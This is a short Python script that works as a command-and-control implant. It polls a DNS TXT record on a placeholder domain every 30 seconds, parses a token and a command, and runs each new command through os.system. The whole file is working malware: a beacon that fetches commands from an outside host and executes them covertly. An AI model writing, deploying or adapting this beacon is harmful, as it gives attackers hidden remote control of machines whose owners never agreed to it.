import os
import dns.resolver
import time
import math

def getCmd(domain):
    result = str(dns.resolver.resolve(domain,"TXT").response.answer[0])
    cmd = result.split('"')[1]
    return cmd

def delay(s):
    print("Sleeping for %d seconds" % s)
    if s <= 5:
        for i in range(s):
            # print(". " * i)
            time.sleep(1)
    else:
        interval = math.trunc(s/5)
        i = 0
        count = 0
        while i <  s:
            # print(". " * count)
            # count += 1
            time.sleep(interval)
            i += interval

domain = "<DOMAIN>" # change this
tokens = []
sleeptime = 30 # how often it checks for cmds

while True:
    print("pinging C2")
    cmd = getCmd(domain)
    print("Received: %s" % cmd)
    token = cmd.split(";")[0]
    if token in tokens:
        print("No New Instructions")
    else:
        tokens.append(token)
        cmd = "".join(cmd.split(";")[1:])
        print("Commands Identified: %s" % cmd)
        if cmd != "NULL":
            os.system(cmd)
    delay(sleeptime)
